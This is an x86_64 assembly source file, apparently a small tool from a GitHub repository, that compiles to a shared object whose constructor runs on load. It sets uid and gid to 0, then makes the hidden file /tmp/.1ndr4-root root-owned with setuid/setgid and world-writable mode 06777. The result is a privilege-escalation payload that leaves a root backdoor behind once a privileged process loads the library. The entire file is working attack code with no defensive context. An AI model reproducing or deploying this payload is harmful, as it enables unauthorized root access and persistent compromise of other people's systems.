/*
* so.x64.s
*
* Coded by 1ndr4 (indra.kr@gmail.com)
* https://github.com/indra-kr/Tools/blob/master/tinyBinary/x86_64/so.x64.s
*/

        .text
.globl _init
        .type _init, @function
_init:
        /* setgid(0) */
        xorq %rdi,%rdi
        movq %rdi,%rax
        movb $106,%al
        syscall
        /* setuid(0) */
        xorq %rdi,%rdi
        movq %rdi,%rax
        movb $105,%al
        syscall
        jmp tr
cont:
        /* chown("/tmp/.1ndr4-root", 0, 0) */
        pop %rdi
        push %rdi
        xorq %rdx,%rdx
        movq %rdx,%rsi
	movq %rdx,%rax
        movb $92,%al
	syscall
        /* chmod("/tmp/.1ndr4-root", 06777) */
        pop %rdi
        xorq %rdx,%rdx
        movq %rdx,%rsi
	movq %rdx,%rax
        movw $0x0DFF, %si
        movb $90, %al
	syscall
        ret
tr: call cont
        .string "/tmp/.1ndr4-root"
        .section .ctors, "aw"
	.quad _init
